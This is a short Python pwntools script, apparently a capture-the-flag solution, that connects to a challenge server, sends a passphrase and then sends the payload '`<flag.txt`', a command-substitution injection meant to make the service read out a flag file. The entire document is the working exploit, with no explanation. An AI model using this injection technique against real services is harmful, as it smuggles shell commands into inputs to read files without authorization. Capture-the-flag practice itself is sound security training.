from pwn import *

r=remote("ctf.glimpse-of-ism.ml",8001)

print(r.recv(1024))
r.sendline(b"where_we_will_meet_the_most")
print(r.recvline())
print(r.recvline())
print(r.recv(4096).decode())
r.sendline(b"`<flag.txt`")
print(r.recv(1024).decode())


